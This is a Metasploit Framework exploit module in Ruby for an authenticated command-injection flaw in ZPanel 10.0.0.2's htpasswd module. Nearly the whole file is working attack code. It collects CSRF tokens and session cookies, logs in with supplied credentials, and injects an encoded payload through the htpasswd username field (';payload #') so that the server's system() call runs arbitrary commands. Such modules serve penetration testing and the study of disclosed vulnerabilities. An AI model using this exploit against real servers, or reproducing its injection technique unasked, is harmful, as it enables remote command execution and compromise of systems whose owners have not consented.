# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "ZPanel 10.0.0.2 htpasswd Module Username Command Execution",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in ZPanel&#039;s htpasswd module. When
        creating .htaccess using the htpasswd module, the username field can be used to
        inject system commands, which is passed on to a system() function for executing
        the system&#039;s htpasswd&#039;s command.

        Please note: In order to use this module, you must have a valid account to login
        to ZPanel.  An account part of any of the default groups should suffice, such as:
        Administrators, Resellers, or Users (Clients).  By default, there&#039;s already a
        &#039;zadmin&#039; user, but the password is randomly generated.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;shachibista&#039;,  # Original discovery
          &#039;sinn3r&#039;        # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;94038&#039;],
          [&#039;URL&#039;, &#039;https://github.com/bobsta63/zpanelx/commit/fe9cec7a8164801e2b3755b7abeabdd607f97906&#039;],
          [&#039;URL&#039;, &#039;http://forums.zpanelcp.com/showthread.php?27898-Serious-Remote-Execution-Exploit-in-Zpanel-10-0-0-2&#039;]
        ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Platform&#039;       => &#039;unix&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;ZPanel 10.0.0.2 on Linux&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Jun 7 2013",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to ZPanel&#039;, &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to authenticate as&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to authenticate with&#039;])
      ], self.class)
  end


  def peer
    "#{rhost}:#{rport}"
  end


  def check
    res = send_request_raw({&#039;uri&#039; => normalize_uri(target_uri.path)})
    if not res
      print_error("#{peer} - Connection timed out")
      return Exploit::CheckCode::Unknown
    end

    if res.body =~ /This server is running: ZPanel/
      return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end


  def login(base, token, cookie)
    res  = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(base, &#039;index.php&#039;),
      &#039;cookie&#039;    => cookie,
      &#039;vars_post&#039; => {
        &#039;inUsername&#039; => datastore[&#039;USERNAME&#039;],
        &#039;inPassword&#039; => datastore[&#039;PASSWORD&#039;],
        &#039;sublogin2&#039;  => &#039;LogIn&#039;,
        &#039;csfr_token&#039; => token
      }
    })

    if not res
      fail_with(Exploit::Failure::Unknown, "#{peer} - Connection timed out")
    elsif res.body =~ /Application Error/ or res.headers[&#039;location&#039;].to_s =~ /invalidlogin/
      fail_with(Exploit::Failure::NoAccess, "#{peer} - Login failed")
    end

    res.headers[&#039;Set-Cookie&#039;].to_s.scan(/(zUserSaltCookie=[a-z0-9]+)/).flatten[0] || &#039;&#039;
  end


  def get_csfr_info(base, path=&#039;index.php&#039;, cookie=&#039;&#039;, vars={})
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(base),
      &#039;cookie&#039;   => cookie,
      &#039;vars_get&#039; => vars
    })

    fail_with(Exploit::Failure::Unknown, "#{peer} - Connection timed out while collecting CSFR token") if not res

    token = res.body.scan(/<input type="hidden" name="csfr_token" value="(.+)">/).flatten[0] || &#039;&#039;
    sid   = res.headers[&#039;Set-Cookie&#039;].to_s.scan(/(PHPSESSID=[a-z0-9]+)/).flatten[0] || &#039;&#039;
    fail_with(Exploit::Failure::Unknown, "#{peer} - No CSFR token collected") if token.empty?

    return token, sid
  end


  def exec(base, token, sid, user_salt_cookie)
    fake_pass = Rex::Text.rand_text_alpha(5)
    cookie    = "#{sid}; #{user_salt_cookie}"

    send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(base),
      &#039;cookie&#039;   => cookie,
      &#039;vars_get&#039; => {
        &#039;module&#039; => &#039;htpasswd&#039;,
        &#039;action&#039; => &#039;CreateHTA&#039;
      },
      &#039;vars_post&#039; => {
        &#039;inAuthName&#039;          => &#039;Restricted+Area&#039;,
        &#039;inHTUsername&#039;        => ";#{payload.encoded} #",
        &#039;inHTPassword&#039;        => fake_pass,
        &#039;inConfirmHTPassword&#039; => fake_pass,
        &#039;inPath&#039;              => &#039;/&#039;,
        &#039;csfr_token&#039;          => token
      }
    })
  end


  def exploit
    base = target_uri.path

    token, sid = get_csfr_info(base)
    vprint_status("#{peer} - Token=#{token}, SID=#{sid}")

    user_salt_cookie = login(base, token, sid)
    print_good("#{peer} - Logged in as &#039;#{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}&#039;")

    vars = {&#039;module&#039;=>&#039;htpasswd&#039;, &#039;selected&#039;=>&#039;Selected&#039;, &#039;path&#039;=>&#039;/&#039;}
    cookie = "#{sid}; #{user_salt_cookie}"
    token = get_csfr_info(base, &#039;&#039;, cookie, vars)[0]
    vprint_status("#{peer} - Token=#{token}, SID=#{sid}")


    print_status("#{peer} - Executing payload...")
    exec(base, token, sid, user_salt_cookie)
  end

end

